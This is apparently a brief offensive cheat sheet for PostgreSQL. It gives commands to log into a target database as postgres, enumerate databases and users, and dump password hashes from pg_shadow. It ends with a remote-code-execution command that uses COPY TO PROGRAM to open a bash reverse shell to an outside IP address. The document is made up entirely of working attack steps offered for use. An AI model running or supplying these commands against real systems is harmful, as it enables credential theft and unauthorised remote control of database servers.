
```
psql -h <target_ip> -U postgres -d <databasename>
```

Once in

```
\l  
\du  
SELECT * FROM pg_shadow;
```

Select database

```
\c <databasename>
```

RCE

```
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/192.168.45.173/5437 0>&1"';
```